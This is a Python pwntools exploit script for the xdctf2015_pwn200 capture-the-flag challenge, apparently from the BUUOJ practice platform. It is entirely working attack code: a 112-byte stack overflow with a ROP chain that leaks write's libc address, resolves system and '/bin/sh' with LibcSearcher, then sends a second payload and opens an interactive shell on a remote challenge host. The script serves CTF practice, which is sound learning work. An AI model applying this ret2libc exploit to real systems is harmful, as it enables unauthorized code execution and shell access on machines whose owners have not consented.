from LibcSearcher import LibcSearcher
from pwn import *


def xdctf2015_pwn200(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/xdctf2015_pwn200'):
    print('xdctf2015_pwn200 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 25737)
    target_elf = ELF(file_name)

    vuln_addr = p32(target_elf.symbols['vuln'])
    write_plt = p32(target_elf.plt['write'])
    write_got = p32(target_elf.got['write'])

    pop_ret_gadget = p32(0x0804836d)  # pop ebx ; ret
    pop3_ret_gadget = p32(0x08048629)  # pop esi ; pop edi ; pop ebp ; ret

    payload_1 = b'a' * 112
    # read(0, buf, 0x100u);
    payload_1 += write_plt + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)
    payload_1 += vuln_addr

    target.sendlineafter('Welcome to XDCTF2015~!\n', payload_1)
    write_addr = u32(target.recv(4))

    searcher = LibcSearcher('write', write_addr)
    libc_base_addr = write_addr - searcher.dump('write')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'a' * 112
    # system('/bin/sh')
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr
    target.sendline( payload_2)
    target.interactive()
    print('xdctf2015_pwn200 end')

if __name__ == '__main__':
    xdctf2015_pwn200()